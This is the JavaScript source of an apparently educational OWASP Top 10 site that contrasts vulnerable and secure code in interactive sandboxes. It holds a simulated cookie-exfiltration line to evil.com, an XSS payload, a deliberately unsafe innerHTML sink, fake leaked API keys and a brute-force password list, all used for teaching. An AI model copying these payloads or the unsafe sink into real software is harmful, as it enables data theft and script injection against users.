/**
 * app.js — Core rendering logic, tabbed code comparisons,
 * and interactive sandbox simulations for the OWASP Top 10 terminal.
 */

// ─── State ───────────────────────────────────────────────────────────
let activeVulnId = null;
let activeExampleIdx = 0;

// ─── DOM refs ────────────────────────────────────────────────────────
const sidebarNav = document.getElementById("sidebar-nav");
const mainContent = document.getElementById("main-content");
const sidebar = document.getElementById("sidebar");
const overlay = document.getElementById("sidebar-overlay");
const hamburger = document.getElementById("hamburger");
const brandLink = document.getElementById("brand-link");

// ─── Sidebar ─────────────────────────────────────────────────────────
function renderSidebar() {
  sidebarNav.innerHTML = OWASP_DATA.map((v) => {
    const badgeClass = `sidebar__link-badge--${v.badge.type}`;
    return `
      <li>
        <a class="sidebar__link" data-id="${v.id}">
          <span class="sidebar__link-code">${v.code.split(":")[0]}</span>
          <span class="sidebar__link-title">${v.title}</span>
          <span class="sidebar__link-badge ${badgeClass}">${v.badge.text}</span>
        </a>
      </li>`;
  }).join("");
}

// ─── Welcome screen (terminal boot) ─────────────────────────────────
function renderWelcome() {
  activeVulnId = null;
  updateActiveLink();

  const cards = OWASP_DATA.map(
    (v) => `
    <a class="welcome__card" data-id="${v.id}">
      <div class="welcome__card-code">${v.code}</div>
      <div class="welcome__card-title">${v.title}</div>
    </a>`
  ).join("");

  const tableRows = OWASP_DATA.map((v) => {
    let arrow = "";
    if (v.badge.type === "new")
      arrow = '<span class="new-badge">NEW</span>';
    else if (v.badge.type === "moved-up")
      arrow = '<span class="arrow-up">^ ' + v.badge.text + "</span>";
    else if (v.badge.type === "moved-down")
      arrow = '<span class="arrow-down">v ' + v.badge.text + "</span>";
    else arrow = v.badge.text;

    return `<tr>
      <td>${v.code}</td>
      <td>${v.title}</td>
      <td>${v.prevCode || "---"}</td>
      <td>${v.prevTitle || "---"}</td>
      <td>${arrow}</td>
    </tr>`;
  }).join("");

  mainContent.innerHTML = `
    <div class="welcome">
      <pre class="welcome__ascii">
 ██████  ██     ██  █████  ███████ ██████
██    ██ ██     ██ ██   ██ ██      ██   ██
██    ██ ██  █  ██ ███████ ███████ ██████
██    ██ ██ ███ ██ ██   ██      ██ ██
 ██████   ███ ███  ██   ██ ███████ ██
      ╔══════════════════════════════╗
      ║    T O P   1 0  //  2 0 2 5 ║
      ╚══════════════════════════════╝</pre>

      <div class="welcome__boot">
        <div class="welcome__boot-line">[boot] Loading OWASP vulnerability database...</div>
        <div class="welcome__boot-line welcome__boot-line--ok">[  OK] 10 categories loaded (2025 edition)</div>
        <div class="welcome__boot-line welcome__boot-line--ok">[  OK] 50 code comparison examples ready</div>
        <div class="welcome__boot-line welcome__boot-line--ok">[  OK] 10 interactive sandboxes initialized</div>
        <div class="welcome__boot-line welcome__boot-line--warn">[WARN] 2 NEW categories detected vs. 2021</div>
        <div class="welcome__boot-line welcome__boot-line--warn">[WARN] 1 category absorbed (SSRF → A01)</div>
        <div class="welcome__boot-line welcome__boot-line--prompt cursor-blink">> Select a vulnerability to explore</div>
      </div>

      <div class="welcome__grid">${cards}</div>
    </div>

    <div style="max-width:780px; margin:1.5rem auto 0;">
      <table class="comparison-table">
        <thead>
          <tr><th>2025</th><th>Category</th><th>2021</th><th>Previous Name</th><th>Change</th></tr>
        </thead>
        <tbody>${tableRows}</tbody>
      </table>
    </div>`;
}

// ─── Vulnerability detail page ───────────────────────────────────────
function renderVulnerability(id) {
  const v = OWASP_DATA.find((d) => d.id === id);
  if (!v) return;

  activeVulnId = id;
  activeExampleIdx = 0;
  updateActiveLink();
  closeSidebar();

  mainContent.innerHTML = `
    <!-- Header -->
    <div class="vuln-header">
      <div class="vuln-header__code">${v.code}</div>
      <h1 class="vuln-header__title">${v.title}</h1>
      <div class="vuln-header__badges">
        <span class="badge badge--${v.badge.type}">${v.badge.text}</span>
        ${v.prevCode
          ? `<span class="badge badge--prev">${v.prevCode}: ${v.prevTitle}</span>`
          : ""}
      </div>
    </div>

    <!-- Description -->
    <div class="section">
      <h2 class="section__title">Overview</h2>
      <div class="section__body">${v.description}</div>
    </div>

    <!-- 2021 vs 2025 -->
    <div class="section">
      <h2 class="section__title">What Changed (2021 vs 2025)</h2>
      <div class="section__body">${v.comparison}</div>
    </div>

    <!-- Interactive Sandbox -->
    <div class="sandbox">
      <div class="sandbox__header">
        <span class="sandbox__header-icon">&gt;_</span>
        <div class="sandbox__header-content">
          <div class="sandbox__header-title">${v.sandbox.title}</div>
          <div class="sandbox__header-desc">${v.sandbox.description}</div>
        </div>
      </div>
      <div class="sandbox__body">
        <div class="sandbox__columns">
          <div class="sandbox__column sandbox__column--vulnerable">
            <div class="sandbox__column-header">
              <span style="color:var(--red);">&#9679;</span> ${v.sandbox.vulnerableLabel}
            </div>
            <div class="sandbox__column-body" id="sandbox-vuln"></div>
          </div>
          <div class="sandbox__column sandbox__column--secure">
            <div class="sandbox__column-header">
              <span style="color:var(--green);">&#9679;</span> ${v.sandbox.secureLabel}
            </div>
            <div class="sandbox__column-body" id="sandbox-secure"></div>
          </div>
        </div>
      </div>
    </div>

    <!-- Code Comparison with tabs -->
    <div class="code-section">
      <div class="section" style="margin-bottom:0.5rem;">
        <h2 class="section__title">Code Examples (${v.examples.length})</h2>
      </div>
      <div class="code-tabs" id="code-tabs"></div>
      <div class="code-comparison" id="code-comparison"></div>
    </div>`;

  // Render tabs and first example
  renderCodeTabs(v);
  renderCodeExample(v, 0);

  // Mount sandbox
  try { mountSandbox(v.id); } catch (e) { console.error("Sandbox error:", e); }

  // Syntax highlighting
  highlightCode();

  window.scrollTo({ top: 0, behavior: "smooth" });
}

// ─── Code tab rendering ──────────────────────────────────────────────
function renderCodeTabs(v) {
  const tabsEl = document.getElementById("code-tabs");
  if (!tabsEl) return;

  tabsEl.innerHTML = v.examples
    .map(
      (ex, i) =>
        `<button class="code-tab ${i === activeExampleIdx ? "code-tab--active" : ""}"
                data-example="${i}">${i + 1}. ${ex.title}</button>`
    )
    .join("");
}

function renderCodeExample(v, idx) {
  const compEl = document.getElementById("code-comparison");
  if (!compEl) return;

  const ex = v.examples[idx];
  const vulnLang = ex.vulnLang || detectLanguage(ex.vulnerableCode);
  const secureLang = ex.secureLang || detectLanguage(ex.secureCode);
  const vulnLabel = LANG_LABELS[vulnLang] || vulnLang;
  const secureLabel = LANG_LABELS[secureLang] || secureLang;

  compEl.innerHTML = `
    <div class="code-panel code-panel--vulnerable">
      <div class="code-panel__header">
        <span class="code-panel__header-dot"></span> VULNERABLE
        <span class="code-panel__lang-badge">${vulnLabel}</span>
      </div>
      <div class="code-panel__body">
        <pre><code class="language-${vulnLang}">${escapeHtml(ex.vulnerableCode)}</code></pre>
      </div>
    </div>
    <div class="code-panel code-panel--secure">
      <div class="code-panel__header">
        <span class="code-panel__header-dot"></span> SECURE
        <span class="code-panel__lang-badge">${secureLabel}</span>
      </div>
      <div class="code-panel__body">
        <pre><code class="language-${secureLang}">${escapeHtml(ex.secureCode)}</code></pre>
      </div>
    </div>`;

  highlightCode();
}

function highlightCode() {
  if (!window.Prism) return;
  requestAnimationFrame(() => {
    try {
      document.querySelectorAll('.code-panel__body pre code[class*="language-"]').forEach((el) => {
        Prism.highlightElement(el);
      });
    } catch (e) {
      console.error("Prism error:", e);
    }
  });
}

// ─── Helpers ─────────────────────────────────────────────────────────
function escapeHtml(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function detectLanguage(code) {
  const t = code.trimStart();
  // HTML/Markup — only if it starts with < or has closing tags (not PHP or Apache config)
  if ((t.startsWith("<") && !t.startsWith("<?php") && !t.startsWith("<FilesMatch") && !t.startsWith("<DirectoryMatch")) || (code.includes("</") && !code.includes("<?php") && !code.includes("</FilesMatch") && !code.includes("</DirectoryMatch"))) return "markup";
  // JSON
  if (t.startsWith("{") && code.includes('"dependencies"'))
    return "json";
  // PHP
  if (code.includes("<?php") || code.includes("$pdo") || code.includes("$stmt") || code.includes("password_hash(") || code.includes("session_start") || code.includes("ini_set("))
    return "php";
  // Java (check before Python — has specific annotations/keywords)
  if (code.includes("public class ") || code.includes("@RestController") || code.includes("@PostMapping") || code.includes("@DeleteMapping") || code.includes("@ControllerAdvice") || code.includes("@ExceptionHandler") || code.includes("ResponseEntity") || code.includes("@RateLimiter"))
    return "java";
  // C#
  if (code.includes("[Authorize]") || code.includes("[ApiController]") || code.includes("IActionResult") || code.includes("public async Task") || code.includes("Result<") || code.includes("StatusCode(") || code.includes("StringComparison."))
    return "csharp";
  // Go (check before Python — both use # but Go has func, package, :=)
  if (code.includes("func ") && (code.includes("package ") || code.includes(":= ") || code.includes("http.Handler") || code.includes("http.ResponseWriter") || code.includes("json.NewDecoder") || code.includes("json.NewEncoder")))
    return "go";
  // Ruby (check before Python — both use def and #)
  if (code.match(/\bend\b/) && (code.includes("do |") || code.includes("require '") || code.includes("class ") && code.includes("< ") || code.includes(".to_json") || code.includes("def ")))
    return "ruby";
  // Python (check before bash)
  if ((code.includes("def ") && code.match(/:\s*$/m)) || code.includes("import ") && (code.includes("flask") || code.includes("hashlib") || code.includes("bcrypt") || code.includes("secrets") || code.includes("logging") || code.includes("requests") || code.includes("json")) || code.includes("@app.route") || code.includes("f\"") || code.includes("__name__"))
    return "python";
  // YAML
  if (code.match(/^\s*name:\s/m) && (code.includes("steps:") || code.includes("jobs:") || code.includes("on:")))
    return "yaml";
  // Bash / Config files
  if (code.includes("#!/") || code.includes("Options +") || code.includes("Options -") || code.includes(".npmrc") || code.includes("<FilesMatch") || code.includes("<DirectoryMatch") || code.includes("Header set ") || code.includes("pip install") || code.includes("npm install") || code.includes("gem install"))
    return "bash";
  // SQL
  if (code.match(/\b(SELECT|INSERT|CREATE TABLE|ALTER TABLE|DROP TABLE)\b/i) && !code.includes("function"))
    return "sql";
  return "javascript";
}

const LANG_LABELS = {
  javascript: "JavaScript",
  markup: "HTML",
  bash: "Bash / Config",
  json: "JSON",
  python: "Python",
  java: "Java",
  go: "Go",
  csharp: "C#",
  php: "PHP",
  ruby: "Ruby",
  sql: "SQL",
  yaml: "YAML"
};

function updateActiveLink() {
  document.querySelectorAll(".sidebar__link").forEach((link) => {
    link.classList.toggle(
      "sidebar__link--active",
      link.dataset.id === activeVulnId
    );
  });
}

function closeSidebar() {
  sidebar.classList.remove("sidebar--open");
  overlay.classList.remove("sidebar-overlay--visible");
}

// ─── Event delegation ────────────────────────────────────────────────
document.addEventListener("click", (e) => {
  // Code example tab clicked
  const tab = e.target.closest(".code-tab");
  if (tab) {
    const idx = parseInt(tab.dataset.example, 10);
    const v = OWASP_DATA.find((d) => d.id === activeVulnId);
    if (v && !isNaN(idx)) {
      activeExampleIdx = idx;
      // Update active tab
      document.querySelectorAll(".code-tab").forEach((t, i) => {
        t.classList.toggle("code-tab--active", i === idx);
      });
      renderCodeExample(v, idx);
    }
    return;
  }

  // Sidebar / welcome card link
  const link = e.target.closest("[data-id]");
  if (link && !link.classList.contains("code-tab")) {
    e.preventDefault();
    renderVulnerability(link.dataset.id);
    return;
  }

  // Brand → home
  if (e.target.closest("#brand-link")) {
    e.preventDefault();
    renderWelcome();
    return;
  }

  // Hamburger
  if (e.target.closest("#hamburger")) {
    sidebar.classList.toggle("sidebar--open");
    overlay.classList.toggle("sidebar-overlay--visible");
    return;
  }

  // Close sidebar overlay
  if (e.target.closest("#sidebar-overlay")) {
    closeSidebar();
  }
});

// ─── Hash-based navigation ───────────────────────────────────────────
function handleHash() {
  const hash = window.location.hash.replace("#", "");
  if (hash && OWASP_DATA.find((d) => d.id === hash)) {
    renderVulnerability(hash);
  } else {
    renderWelcome();
  }
}

window.addEventListener("hashchange", handleHash);

// ═════════════════════════════════════════════════════════════════════
//  SANDBOX SIMULATIONS
// ═════════════════════════════════════════════════════════════════════

function mountSandbox(id) {
  const vulnEl = document.getElementById("sandbox-vuln");
  const secureEl = document.getElementById("sandbox-secure");
  if (!vulnEl || !secureEl) return;

  const handlers = {
    a01: sandboxA01,
    a02: sandboxA02,
    a03: sandboxA03,
    a04: sandboxA04,
    a05: sandboxA05,
    a06: sandboxA06,
    a07: sandboxA07,
    a08: sandboxA08,
    a09: sandboxA09,
    a10: sandboxA10,
  };

  if (handlers[id]) handlers[id](vulnEl, secureEl);
}

// ─── A01: Broken Access Control ──────────────────────────────────────
function sandboxA01(vulnEl, secureEl) {
  vulnEl.innerHTML = `
    <p class="sandbox-desc">
      Admin panel exists in DOM, hidden with CSS.</p>
    <button class="sandbox-btn sandbox-btn--vulnerable" id="a01-vuln-btn">
      $ reveal --force admin-panel
    </button>
    <div id="a01-vuln-panel" style="display:none; margin-top:0.5rem; padding:0.5rem;
         background:var(--red-muted); border-radius:3px; border:1px solid var(--border-red);">
      <strong style="color:var(--red); font-size:0.9rem;">! ADMIN DASHBOARD (EXPOSED)</strong><br>
      <span style="font-size:0.88rem; color:var(--text-secondary); font-family:var(--font-mono);">
        API_KEY=sk-live-12345-ABCDE<br>
        Users: 14,203 | Revenue: $1.2M<br>
        <button style="margin-top:0.3rem; color:var(--red); background:var(--red-muted);
                border:1px solid var(--border-red); padding:0.15rem 0.4rem; border-radius:3px;
                cursor:pointer; font-size:0.82rem; font-family:var(--font-mono);">DELETE ALL USERS</button>
      </span>
    </div>`;

  document.getElementById("a01-vuln-btn").addEventListener("click", () => {
    const panel = document.getElementById("a01-vuln-panel");
    panel.style.display = panel.style.display === "none" ? "block" : "none";
  });

  secureEl.innerHTML = `
    <p class="sandbox-desc">
      Select a role and attempt access.</p>
    <div class="flex gap-sm flex-wrap" style="margin-bottom:0.4rem;">
      <button class="sandbox-btn sandbox-btn--secure" data-role="user">$ login --role user</button>
      <button class="sandbox-btn sandbox-btn--secure" data-role="admin">$ login --role admin</button>
    </div>
    <div class="sandbox-output sandbox-output--secure" id="a01-secure-output">Awaiting authentication...</div>`;

  secureEl.querySelectorAll("[data-role]").forEach((btn) => {
    btn.addEventListener("click", () => {
      const role = btn.dataset.role;
      const output = document.getElementById("a01-secure-output");
      const header = btoa(JSON.stringify({ alg: "HS256", typ: "JWT" }));
      const payload = btoa(
        JSON.stringify({ sub: "user123", role, exp: Math.floor(Date.now() / 1000) + 3600 })
      );
      const mockToken = header + "." + payload + ".sig";

      try {
        const decoded = JSON.parse(atob(mockToken.split(".")[1]));
        if (decoded.role === "admin" && decoded.exp > Date.now() / 1000) {
          output.innerHTML =
            '<span class="log-success">[OK] Token verified. Role: admin. ACCESS GRANTED.</span>\n' +
            '<span class="log-info">[>>] Rendering admin panel for verified user...</span>';
        } else {
          output.innerHTML =
            '<span class="log-error">[!!] Token verified. Role: ' + decoded.role + '. ACCESS DENIED.</span>\n' +
            '<span class="log-info">[--] Admin panel was never rendered. No DOM to inspect.</span>';
        }
      } catch {
        output.innerHTML = '<span class="log-error">[!!] Invalid token. ACCESS DENIED.</span>';
      }
    });
  });
}

// ─── A02: Security Misconfiguration ──────────────────────────────────
function sandboxA02(vulnEl, secureEl) {
  const files = [
    { name: ".env", size: "1.2K", sensitive: true, content: "DB_PASSWORD=SuperSecret123!\nAWS_SECRET_KEY=AKIAIOSFODNN7EXAMPLE\nSTRIPE_KEY=sk_live_abc123" },
    { name: ".git/config", size: "342B", sensitive: true, content: "[remote origin]\n  url = https://token:ghp_xxxx@github.com/corp/app.git" },
    { name: "backup/dump.sql", size: "24M", sensitive: true, content: "-- MySQL dump\n-- Passwords in plain text..." },
    { name: "index.html", size: "8.4K", sensitive: false, content: "" },
    { name: "style.css", size: "3.1K", sensitive: false, content: "" },
    { name: "app.js", size: "12K", sensitive: false, content: "" },
  ];

  vulnEl.innerHTML = `
    <p class="sandbox-desc">
      Directory listing enabled. Click files to view.</p>
    <div style="font-family:var(--font-mono); font-size:0.95rem;">
      <div style="color:var(--text-muted); margin-bottom:0.2rem;">Index of /var/www/html/</div>
      ${files.map((f, i) => `
        <div class="a02-file" data-idx="${i}" data-sensitive="${f.sensitive}"
             style="padding:0.25rem 0.4rem; cursor:pointer; border-bottom:1px solid rgba(255,255,255,0.03);
                    display:flex; justify-content:space-between;
                    color:${f.sensitive ? "var(--red)" : "var(--text-secondary)"};">
          <span>${f.sensitive ? "! " : "  "}${f.name}</span>
          <span style="color:var(--text-muted);">${f.size}</span>
        </div>`).join("")}
    </div>
    <div class="sandbox-output sandbox-output--vulnerable" id="a02-vuln-output" style="margin-top:0.4rem;">
      Click a file to view...</div>`;

  vulnEl.querySelectorAll(".a02-file").forEach((el) => {
    el.addEventListener("click", () => {
      const output = document.getElementById("a02-vuln-output");
      const idx = parseInt(el.dataset.idx, 10);
      const file = files[idx];
      if (file.content) {
        output.innerHTML = file.sensitive
          ? '<span class="log-error">[!!] SENSITIVE FILE EXPOSED:</span>\n' + escapeHtml(file.content)
          : '<span class="log-info">[--] Public file. No risk.</span>';
      } else {
        output.innerHTML = '<span class="log-info">[--] Public file. No sensitive data.</span>';
      }
    });
  });

  secureEl.innerHTML = `
    <p class="sandbox-desc">
      Directory listing disabled. Access rules enforced.</p>
    <div style="font-family:var(--font-mono); font-size:0.95rem;">
      ${files.map((f, i) => `
        <div class="a02-file-secure" data-idx="${i}" data-sensitive="${f.sensitive}"
             style="padding:0.25rem 0.4rem; cursor:pointer; border-bottom:1px solid rgba(255,255,255,0.03);
                    display:flex; justify-content:space-between; color:var(--text-secondary);">
          <span>  ${f.name}</span><span style="color:var(--text-muted);">${f.size}</span>
        </div>`).join("")}
    </div>
    <div class="sandbox-output sandbox-output--secure" id="a02-secure-output" style="margin-top:0.4rem;">
      Try accessing any file...</div>`;

  secureEl.querySelectorAll(".a02-file-secure").forEach((el) => {
    el.addEventListener("click", () => {
      const output = document.getElementById("a02-secure-output");
      const idx = parseInt(el.dataset.idx, 10);
      output.innerHTML = files[idx].sensitive
        ? '<span class="log-success">[OK] 403 Forbidden</span>\n<span class="log-info">[--] Blocked by .htaccess rules.</span>'
        : '<span class="log-success">[OK] 200 OK — Public file served.</span>';
    });
  });
}

// ─── A03: Supply Chain / SRI ─────────────────────────────────────────
function sandboxA03(vulnEl, secureEl) {
  vulnEl.innerHTML = `
    <p class="sandbox-desc">
      CDN script has been tampered with by an attacker.</p>
    <button class="sandbox-btn sandbox-btn--vulnerable" id="a03-vuln-btn">$ curl cdn.example.com/utils.js</button>
    <div class="sandbox-output sandbox-output--vulnerable" id="a03-vuln-output"></div>`;

  document.getElementById("a03-vuln-btn").addEventListener("click", () => {
    const output = document.getElementById("a03-vuln-output");
    output.innerHTML = "";
    logLine(output, "log-info", "[>>] GET https://cdn.example.com/utils@3.1.0/utils.min.js");
    setTimeout(() => {
      logLine(output, "log-warn", "[!!] 200 OK — file was MODIFIED by attacker");
      logLine(output, "log-error", "[XX] Malicious payload executing...");
      logLine(output, "log-error", "     fetch('https://evil.com/steal', { body: document.cookie })");
      logLine(output, "log-error", "     Cookies + localStorage EXFILTRATED");
      logLine(output, "log-error", "[XX] No integrity check. Browser trusted blindly.");
    }, 500);
  });

  secureEl.innerHTML = `
    <p class="sandbox-desc">
      Same tampered script, but with SRI integrity attribute.</p>
    <button class="sandbox-btn sandbox-btn--secure" id="a03-secure-btn">$ curl --check-sri cdn.example.com/utils.js</button>
    <div class="sandbox-output sandbox-output--secure" id="a03-secure-output"></div>`;

  document.getElementById("a03-secure-btn").addEventListener("click", () => {
    const output = document.getElementById("a03-secure-output");
    output.innerHTML = "";
    logLine(output, "log-info", "[>>] GET https://cdn.example.com/utils@3.1.0/utils.min.js");
    logLine(output, "log-info", '[>>] integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6..."');
    setTimeout(() => {
      logLine(output, "log-warn", "[!!] 200 OK — file was tampered with");
      logLine(output, "log-info", "[>>] Computing SHA-384 hash...");
      setTimeout(() => {
        logLine(output, "log-info", "     Expected: sha384-oqVuAfXRKap7fdgcCY5uykM6...");
        logLine(output, "log-error", "     Received: sha384-x8F2mNkQ9pLvR3wT7yU1oA...");
        logLine(output, "log-success", "[OK] HASH MISMATCH — Execution BLOCKED");
        logLine(output, "log-success", "[OK] No malicious code ran. User is safe.");
      }, 400);
    }, 500);
  });
}

// ─── A04: Cryptographic Failures ─────────────────────────────────────
function sandboxA04(vulnEl, secureEl) {
  vulnEl.innerHTML = `
    <p class="sandbox-desc">
      Store a password insecurely in LocalStorage.</p>
    <input type="text" class="sandbox-input" id="a04-vuln-pw" placeholder="Enter password..." style="margin-bottom:0.4rem;">
    <button class="sandbox-btn sandbox-btn--vulnerable" id="a04-vuln-btn">$ store --base64</button>
    <div class="sandbox-output sandbox-output--vulnerable" id="a04-vuln-output"></div>`;

  document.getElementById("a04-vuln-btn").addEventListener("click", () => {
    const pw = document.getElementById("a04-vuln-pw").value;
    const output = document.getElementById("a04-vuln-output");
    if (!pw) { output.textContent = "Enter a password first."; return; }
    const b64 = btoa(pw);
    localStorage.setItem("owasp_demo_vuln_pw", b64);
    output.innerHTML = "";
    logLine(output, "log-warn", "[!!] Stored as Base64 in localStorage:");
    logLine(output, "log-error", '     key: "owasp_demo_vuln_pw"');
    logLine(output, "log-error", "     val: " + b64);
    logLine(output, "log-warn", "[>>] atob('" + b64 + "')");
    logLine(output, "log-error", "     = " + pw);
    logLine(output, "log-error", "[XX] Password fully recoverable. Base64 != encryption.");
  });

  secureEl.innerHTML = `
    <p class="sandbox-desc">
      Hash a password with PBKDF2 + random salt.</p>
    <input type="text" class="sandbox-input" id="a04-sec-pw" placeholder="Enter password..." style="margin-bottom:0.4rem;">
    <button class="sandbox-btn sandbox-btn--secure" id="a04-sec-btn">$ hash --pbkdf2 --iterations 600000</button>
    <div class="sandbox-output sandbox-output--secure" id="a04-sec-output"></div>`;

  document.getElementById("a04-sec-btn").addEventListener("click", async () => {
    const pw = document.getElementById("a04-sec-pw").value;
    const output = document.getElementById("a04-sec-output");
    if (!pw) { output.textContent = "Enter a password first."; return; }
    output.innerHTML = "";
    logLine(output, "log-info", "[>>] Generating 16-byte random salt...");
    try {
      const enc = new TextEncoder();
      const salt = crypto.getRandomValues(new Uint8Array(16));
      const saltHex = Array.from(salt).map((b) => b.toString(16).padStart(2, "0")).join("");
      logLine(output, "log-info", "     salt: " + saltHex);
      logLine(output, "log-info", "[>>] PBKDF2 (600K iterations, SHA-256)...");
      const keyMaterial = await crypto.subtle.importKey("raw", enc.encode(pw), "PBKDF2", false, ["deriveBits"]);
      const hash = await crypto.subtle.deriveBits({ name: "PBKDF2", salt, iterations: 600000, hash: "SHA-256" }, keyMaterial, 256);
      const hashHex = Array.from(new Uint8Array(hash)).map((b) => b.toString(16).padStart(2, "0")).join("");
      const stored = saltHex + ":" + hashHex;
      localStorage.setItem("owasp_demo_secure_pw", stored);
      logLine(output, "log-success", "[OK] Stored: " + stored.substring(0, 50) + "...");
      logLine(output, "log-success", "[OK] Original password is NOT recoverable.");
    } catch (e) {
      logLine(output, "log-error", "[XX] Web Crypto error: " + e.message);
      logLine(output, "log-info", "     (Requires HTTPS or localhost)");
    }
  });
}

// ─── A05: Injection (XSS) ───────────────────────────────────────────
function sandboxA05(vulnEl, secureEl) {
  vulnEl.innerHTML = `
    <p class="sandbox-desc">
      Type a query. Try: <code>&lt;img src=x onerror=alert('XSS')&gt;</code></p>
    <input type="text" class="sandbox-input" id="a05-vuln-input"
           placeholder='<img src=x onerror=alert("XSS")>' style="margin-bottom:0.4rem;">
    <div id="a05-vuln-results" style="padding:0.4rem; min-height:1.5rem; background:#000;
         border-radius:3px; font-size:1.1rem; color:var(--text-secondary);"></div>
    <div class="sandbox-output sandbox-output--vulnerable" id="a05-vuln-output" style="margin-top:0.4rem;"></div>`;

  document.getElementById("a05-vuln-input").addEventListener("input", (e) => {
    const query = e.target.value;
    const results = document.getElementById("a05-vuln-results");
    const output = document.getElementById("a05-vuln-output");
    results.innerHTML = "<p>Results for: <strong>" + query + "</strong></p>";
    output.innerHTML = query.includes("<") && query.includes(">")
      ? '<span class="log-error">[XX] HTML injected via innerHTML!</span>\n<span class="log-error">[XX] Browser parsed and executed the markup.</span>'
      : '<span class="log-info">[--] Type HTML/JS to trigger injection.</span>';
  });

  secureEl.innerHTML = `
    <p class="sandbox-desc">
      Same input, rendered safely with <code>textContent</code>.</p>
    <input type="text" class="sandbox-input" id="a05-sec-input"
           placeholder='<img src=x onerror=alert("XSS")>' style="margin-bottom:0.4rem;">
    <div id="a05-sec-results" style="padding:0.4rem; min-height:1.5rem; background:#000;
         border-radius:3px; font-size:1.1rem; color:var(--text-secondary);"></div>
    <div class="sandbox-output sandbox-output--secure" id="a05-sec-output" style="margin-top:0.4rem;"></div>`;

  document.getElementById("a05-sec-input").addEventListener("input", (e) => {
    const query = e.target.value;
    document.getElementById("a05-sec-results").textContent = "Results for: " + query;
    const output = document.getElementById("a05-sec-output");
    output.innerHTML = query.includes("<") && query.includes(">")
      ? '<span class="log-success">[OK] HTML rendered as plain text.</span>\n<span class="log-success">[OK] textContent neutralized the XSS payload.</span>'
      : '<span class="log-info">[--] Type HTML/JS to see it neutralized.</span>';
  });
}

// ─── A06: Insecure Design (Coupon) ───────────────────────────────────
function sandboxA06(vulnEl, secureEl) {
  let vulnTotal = 100;
  vulnEl.innerHTML = `
    <p class="sandbox-desc">
      Apply coupon <code>SAVE20</code> unlimited times.</p>
    <div style="font-size:1.1rem; font-weight:700; color:var(--text-bright); margin-bottom:0.4rem;"
         id="a06-vuln-total">$100.00</div>
    <div class="flex gap-sm">
      <input type="text" class="sandbox-input" id="a06-vuln-coupon" value="SAVE20" style="max-width:120px;">
      <button class="sandbox-btn sandbox-btn--vulnerable" id="a06-vuln-btn">Apply</button>
    </div>
    <div class="sandbox-output sandbox-output--vulnerable" id="a06-vuln-output" style="margin-top:0.4rem;"></div>`;

  document.getElementById("a06-vuln-btn").addEventListener("click", () => {
    const code = document.getElementById("a06-vuln-coupon").value;
    const output = document.getElementById("a06-vuln-output");
    if (code === "SAVE20") {
      vulnTotal -= 20;
      document.getElementById("a06-vuln-total").textContent = "$" + vulnTotal.toFixed(2);
      logLine(output, vulnTotal <= 0 ? "log-error" : "log-warn",
        "[-$20] Total: $" + vulnTotal.toFixed(2));
      if (vulnTotal <= 0) logLine(output, "log-error", "[XX] Items are FREE (or store owes you)!");
    } else {
      logLine(output, "log-info", "[--] Invalid coupon.");
    }
  });

  let secTotal = 100;
  const used = new Set();
  secureEl.innerHTML = `
    <p class="sandbox-desc">
      Single-use enforcement enabled.</p>
    <div style="font-size:1.1rem; font-weight:700; color:var(--text-bright); margin-bottom:0.4rem;"
         id="a06-sec-total">$100.00</div>
    <div class="flex gap-sm">
      <input type="text" class="sandbox-input" id="a06-sec-coupon" value="SAVE20" style="max-width:120px;">
      <button class="sandbox-btn sandbox-btn--secure" id="a06-sec-btn">Apply</button>
    </div>
    <div class="sandbox-output sandbox-output--secure" id="a06-sec-output" style="margin-top:0.4rem;"></div>`;

  document.getElementById("a06-sec-btn").addEventListener("click", () => {
    const code = document.getElementById("a06-sec-coupon").value;
    const output = document.getElementById("a06-sec-output");
    if (used.has(code)) { logLine(output, "log-warn", "[!!] Coupon already used."); return; }
    const discounts = { SAVE20: 20, SAVE10: 10 };
    const d = discounts[code];
    if (!d) { logLine(output, "log-info", "[--] Invalid coupon."); return; }
    if (secTotal - d < 0) { logLine(output, "log-warn", "[!!] Discount exceeds total."); return; }
    secTotal -= d;
    used.add(code);
    document.getElementById("a06-sec-total").textContent = "$" + secTotal.toFixed(2);
    logLine(output, "log-success", "[OK] -$" + d + ". Total: $" + secTotal.toFixed(2) + " (coupon consumed)");
  });
}

// ─── A07: Authentication / Brute Force ───────────────────────────────
function sandboxA07(vulnEl, secureEl) {
  const pws = ["123456", "password", "admin", "letmein", "welcome", "monkey", "dragon"];

  vulnEl.innerHTML = `
    <p class="sandbox-desc">
      Automated brute-force. No rate limiting.</p>
    <button class="sandbox-btn sandbox-btn--vulnerable" id="a07-vuln-btn">$ brute-force admin@target</button>
    <div class="sandbox-output sandbox-output--vulnerable" id="a07-vuln-output" style="margin-top:0.4rem;"></div>`;

  document.getElementById("a07-vuln-btn").addEventListener("click", () => {
    const output = document.getElementById("a07-vuln-output");
    const btn = document.getElementById("a07-vuln-btn");
    output.innerHTML = "";
    btn.disabled = true;
    let i = 0;
    const iv = setInterval(() => {
      if (i >= pws.length) { clearInterval(iv); btn.disabled = false; return; }
      if (pws[i] === "dragon") {
        logLine(output, "log-error", '[' + (i + 1) + '] "' + pws[i] + '" — CRACKED!');
        logLine(output, "log-error", "[XX] No rate limiting. " + (i + 1) + " attempts, all instant.");
        clearInterval(iv); btn.disabled = false;
      } else {
        logLine(output, "log-warn", '[' + (i + 1) + '] "' + pws[i] + '" — fail');
      }
      i++;
    }, 350);
  });

  secureEl.innerHTML = `
    <p class="sandbox-desc">
      Same attack. Account lockout after 3 failures.</p>
    <button class="sandbox-btn sandbox-btn--secure" id="a07-sec-btn">$ brute-force admin@target</button>
    <div class="sandbox-output sandbox-output--secure" id="a07-sec-output" style="margin-top:0.4rem;"></div>`;

  document.getElementById("a07-sec-btn").addEventListener("click", () => {
    const output = document.getElementById("a07-sec-output");
    const btn = document.getElementById("a07-sec-btn");
    output.innerHTML = "";
    btn.disabled = true;
    let i = 0, attempts = 0, locked = false;
    const iv = setInterval(() => {
      if (i >= pws.length || locked) { clearInterval(iv); btn.disabled = false; return; }
      attempts++;
      logLine(output, "log-warn", '[' + (i + 1) + '] "' + pws[i] + '" — fail (' + attempts + "/3)");
      if (attempts >= 3) {
        locked = true;
        logLine(output, "log-success", "[OK] ACCOUNT LOCKED for 30s.");
        logLine(output, "log-success", "[OK] Brute force stopped. Password NOT cracked.");
        clearInterval(iv); btn.disabled = false;
      }
      i++;
    }, 400);
  });
}

